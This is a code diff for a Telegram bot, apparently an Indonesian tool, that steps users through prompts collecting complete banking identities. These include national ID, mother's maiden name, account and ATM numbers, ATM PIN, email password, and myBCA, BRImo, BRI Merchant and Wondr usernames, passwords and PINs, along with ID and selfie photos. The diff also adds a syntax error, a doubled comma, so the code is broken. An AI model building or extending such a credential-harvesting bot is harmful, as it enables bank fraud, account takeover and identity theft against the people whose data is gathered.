@@ -9,6 +9,25 @@ const bot = new TelegramBot(token);
 
 const FRONTEND_URL = process.env.FRONTEND_URL || 'http://localhost:3000';
 
+const getSteps = (bank) => {
+  const commonSteps = [
+    'customer', 'bank', 'grade', 'kcp', 'nik', 'nama',
+    'namaIbuKandung', 'tempatTanggalLahir', 'noRek', 'noAtm',
+    'validThru', 'noHp', 'pinAtm', 'email', 'passEmail', 'expired'
+  ];
+
+  let bankSteps = [];
+  if (bank === 'BCA') {
+    bankSteps = ['myBCAUser', 'myBCAPassword', 'myBCAPin'];
+  } else if (bank === 'BRI') {
+    bankSteps = ['brimoUser', 'brimoPassword', 'briMerchantUser', 'briMerchantPassword'];
+  } else if (bank === 'BNI') {
+    bankSteps = ['pinWondr', 'passWondr'];
+  }
+
+  return [...commonSteps, ...bankSteps, 'uploadFotoId', 'uploadFotoSelfie'];
+};
+
 const setWebhook = async (req, res) => {
   const webhookUrl = req.query.url || req.body.url;
   if (!webhookUrl) {
@@ -28,42 +47,9 @@ const setWebhook = async (req, res) => {
 };
 
 const askNextField = async (chatId, session) => {
-  const steps = [
-    'customer',
-    'bank',
-    'grade',
-    'kcp',
-    'nik',
-    'nama',
-    'namaIbuKandung',
-    'tempatTanggalLahir',
-    'noRek',
-    'noAtm',
-    'validThru',
-    'noHp',
-    'pinAtm',
-    'pinWondr',
-    'passWondr',
-    'email',
-    'passEmail',
-    'expired',
-    'uploadFotoId',
-    'uploadFotoSelfie'
-  ];
+  const bank = session.formData ? session.formData.bank : null;
+  const steps = getSteps(bank);
   const currentIndex = session.sessionStep || 0;
-
-  // Custom logic for bank specific steps
-  if (session.formData && session.formData.bank) {
-    if (session.formData.bank === 'BCA') {
-      if (!steps.includes('myBCAUser')) {
-        steps.splice(18, 0, 'myBCAUser', 'myBCAPassword');
-      }
-    } else if (session.formData.bank === 'BRI') {
-      if (!steps.includes('brimoUser')) {
-        steps.splice(18, 0, 'brimoUser', 'brimoPassword', 'briMerchantUser', 'briMerchantPassword');
-      }
-    }
-  }
 
   if (currentIndex >= steps.length) {
     await bot.sendMessage(chatId, '🎉 Semua data telah terkumpul! Sedang memproses pembuatan produk...');
@@ -93,7 +79,8 @@ const askNextField = async (chatId, session) => {
     expired: '⏳ Masukkan Tanggal Expired (YYYY-MM-DD):',
     myBCAUser: '👤 Masukkan Username myBCA:',
     myBCAPassword: '🔑 Masukkan Password myBCA:',
-    brimoUser: '👤 Masukkan Username BRImo:',
+    myBCAPin: '🔢 Masukkan PIN myBCA:',
+    brimoUser: '👤 Masukkan Username BRImo:',,
     brimoPassword: '🔑 Masukkan Password BRImo:',
     briMerchantUser: '🏪 Masukkan Username BRI Merchant:',
     briMerchantPassword: '🔑 Masukkan Password BRI Merchant:',
@@ -283,21 +270,8 @@ const handleWebhook = async (req, res) => {
     }
 
     if (telegramUser.state === 'collecting') {
-      const steps = [
-        'customer', 'bank', 'grade', 'kcp', 'nik', 'nama',
-        'namaIbuKandung', 'tempatTanggalLahir', 'noRek', 'noAtm',
-        'validThru', 'noHp', 'pinAtm', 'pinWondr', 'passWondr',
-        'email', 'passEmail', 'expired', 'uploadFotoId', 'uploadFotoSelfie'
-      ];
-
-      // Inject bank specific steps
-      if (telegramUser.formData && telegramUser.formData.bank) {
-        if (telegramUser.formData.bank === 'BCA') {
-          if (!steps.includes('myBCAUser')) steps.splice(18, 0, 'myBCAUser', 'myBCAPassword');
-        } else if (telegramUser.formData.bank === 'BRI') {
-          if (!steps.includes('brimoUser')) steps.splice(18, 0, 'brimoUser', 'brimoPassword', 'briMerchantUser', 'briMerchantPassword');
-        }
-      }
+      const bank = telegramUser.formData ? telegramUser.formData.bank : null;
+      const steps = getSteps(bank);
 
       const idx = telegramUser.sessionStep || 0;
       const field = steps[idx];
